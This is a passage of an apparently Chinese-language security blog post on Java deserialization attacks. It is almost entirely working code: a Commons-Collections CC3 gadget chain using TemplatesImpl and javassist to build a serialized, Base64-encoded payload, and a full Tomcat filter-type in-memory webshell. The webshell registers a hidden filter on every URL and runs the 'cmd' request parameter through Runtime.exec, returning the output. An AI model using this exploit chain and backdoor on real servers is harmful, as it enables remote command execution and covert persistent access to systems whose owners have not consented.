class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3Re0</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameFiled=tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;i&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field bytecodesField=tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= bytes;</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;为空，不然会爆空调用的错误</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer=<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapeEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapeEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class c=LazyMap.class;</span><br><span class="line">        Field factoryField=c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=Serial(hashMap);</span><br><span class="line">        String payload= Base64Encode(byteArrayOutputStream);</span><br><span class="line">        <span class="type">byte</span>[] bytes2= Base64.getDecoder().decode(payload);</span><br><span class="line">        <span class="comment">//本地反序列化测试</span></span><br><span class="line">        <span class="comment">// ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes2));</span></span><br><span class="line">        <span class="comment">// in.readObject();</span></span><br><span class="line">        <span class="comment">// in.close();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ByteArrayOutputStream <span class="title function_">Serial</span><span class="params">(Map hashMap)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bs);</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        <span class="keyword">return</span> bs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(URLEncoder.encode(s));</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1722150342389-2058cd56-259b-46e8-91f5-8171b8a87237.png#averageHue=%2385a883&clientId=u593b3d90-d82a-4&from=paste&height=542&id=u24b17a71&originHeight=1016&originWidth=2063&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=304082&status=done&style=none&taskId=ua33fff59-58b9-469a-8e78-b0a31e990af&title=&width=1100.2666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1722150342389-2058cd56-259b-46e8-91f5-8171b8a87237.png#averageHue=%2385a883&clientId=u593b3d90-d82a-4&from=paste&height=542&id=u24b17a71&originHeight=1016&originWidth=2063&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=304082&status=done&style=none&taskId=ua33fff59-58b9-469a-8e78-b0a31e990af&title=&width=1100.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>其实这个时候就能够想到往哪赛我们的内存马构造逻辑了—恶意类的静态代码块中。</p>
<h2 id="具体构造"><a href="#具体构造" class="headerlink" title="具体构造"></a>具体构造</h2><p>bro 最开始想的是 javassist 写进去，不过属实想多了，有些方法的调用存在导包等操作，也不在乎那点 payload 长度了，要真遇到万不得已打内存马并且还有 payload 长度限制的情况，就对目标使用线程名写入 payload 的方法吧（<br>首先明确我们要利用的是基于类初始化，调用静态代码块的攻击链，最经典的就是 CC3 的 TemplatesImpl 链，将内置的 bytescode 设置为我们构造好的恶意类即可。<br>那么恶意类怎么写呢？这里以更加泛用的全局存储获取 request 的思路为例子,注入 filter 型内存马，并获取回显<br>首先是恶意类，思路就是给他一步到位，同时完成<code>AbstractTranslet</code>的继承（TemplatesImpl 链必要条件），以及 Filter 接口的实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.New.shellfilter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.WebResourceRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.AbstractProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.net.AbstractEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filtermemshell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">//定个全局变量给request</span></span><br><span class="line">        org.apache.catalina.connector.Request currentreq=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//首先获取StandardService</span></span><br><span class="line">            <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            Field webappclassLoaderBaseField=Class.forName(<span class="string">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span>).getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            webappclassLoaderBaseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);</span><br><span class="line">            <span class="type">Context</span> <span class="variable">Context</span> <span class="operator">=</span>  resources.getContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ApplicationContext applicationContext=(ApplicationContext) context.get(Context);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardServiceField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            standardServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            StandardService standardService=(StandardService) standardServiceField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取Connctor</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectorsField</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectorsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connectors=(Connector[])connectorsField.get(standardService);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//循环遍历Connectors</span></span><br><span class="line">            <span class="keyword">for</span>(Connector connector: connectors ) &#123;</span><br><span class="line">                <span class="comment">//当前去访问请求肯定是Http协议，所以我当前线程生成的connector内置的协议肯定是http</span></span><br><span class="line">                <span class="keyword">if</span> (connector.getScheme().contains(<span class="string">&quot;http&quot;</span>))&#123;</span><br><span class="line">                    <span class="comment">//从Connector中获取到AbstractProtocol对象，实际上现在这个实例是Http11NioProtocol,由于我们获取到的是整个Connectors，也就是说不同的协议存在不同的Connector完成功能的实现，我们这里肯定需要的是Http协议的Connector</span></span><br><span class="line">                    AbstractProtocol abstractProtocol=(AbstractProtocol) connector.getProtocolHandler();</span><br><span class="line">                    <span class="comment">//通过Http11NioProtocol（继承于AbstractProtocol）开始获取ConnectionHandler</span></span><br><span class="line">                    <span class="type">Method</span> <span class="variable">getHandler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>);</span><br><span class="line">                    getHandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    AbstractEndpoint.<span class="type">Handler</span> <span class="variable">connectionhandler</span> <span class="operator">=</span> (AbstractEndpoint.Handler) getHandler.invoke(abstractProtocol);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//开始获取connectionhandler中的global属性</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>).getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    RequestGroupInfo global=(RequestGroupInfo) globalField.get(connectionhandler);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//global的作用就是用来缓存Processor的，因此它里面其实存储着很多Request请求的封装，具体的RequestInfo都是类似Http11Processor这种第二次封装进来的，我们还得判断出我们想要的那个RequestInfo</span></span><br><span class="line">                    Field processorField=Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    ArrayList processors=(ArrayList) processorField.get(global);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (Object processor: processors)&#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span>(RequestInfo) processor;</span><br><span class="line">                        <span class="comment">//这个判断条件就比较的灵活了，看各自当时去访问Memshell时路径的特点（就比如说我们注入了一个filter内存马，用cmd启动，那么就获取到当前请求的cmd参数时，判断为我们的内存马访问请求）</span></span><br><span class="line">                        <span class="keyword">if</span> (requestInfo.getCurrentQueryString().contains(<span class="string">&quot;cmd&quot;</span>))&#123;</span><br><span class="line">                            Field reqfield=Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                            reqfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                            Request request=(Request) reqfield.get(requestInfo);</span><br><span class="line">                            currentreq=(org.apache.catalina.connector.Request) request.getNote(<span class="number">1</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ServletContext servletContext=(ServletContext) currentreq.getServletContext();</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext2</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext2);</span><br><span class="line"></span><br><span class="line">            Filtermemshell filter=<span class="keyword">new</span> <span class="title class_">Filtermemshell</span>();</span><br><span class="line">            String name=<span class="string">&quot;shellfilter&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            FilterMap filterMap=<span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Field configsField=standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            configsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            java.util.Map filterconfigs=(java.util.Map)configsField.get(standardContext);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Constructor constructor=ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig=(ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">            filterconfigs.put(name, filterConfig);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="comment">//将命令执行结果写入扫描器并读取所有输入</span></span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> scanner.hasNext()?scanner.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                scanner.close();</span><br><span class="line">                writer.write(result);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后将上面这块的字节码塞入 TemplatesImpl 的 bytes 中，用于最后的 defineClass 进行字节码加载</p>
